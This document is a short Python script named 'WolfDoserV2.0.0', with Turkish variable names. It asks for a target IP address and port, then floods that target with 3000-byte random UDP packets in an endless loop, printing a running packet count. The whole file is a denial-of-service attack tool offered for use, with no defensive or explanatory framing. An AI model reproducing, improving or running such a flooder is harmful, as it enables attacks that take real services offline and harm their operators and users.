import os
import socket
import random

os.system("clear")
banner="""

#########################
# WolfDoserV2.0.0       #
# Code by DnZ Cglr DRMZ #
#########################

"""
print(banner)

hedef_ip=raw_input("hedef_ip: ")
hedef_port=input("hedef_port: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
        sock.sendto(bytes,(hedef_ip,hedef_port))
	sayac=sayac+1
	print("Paket Sayisi:%s"%(sayac))
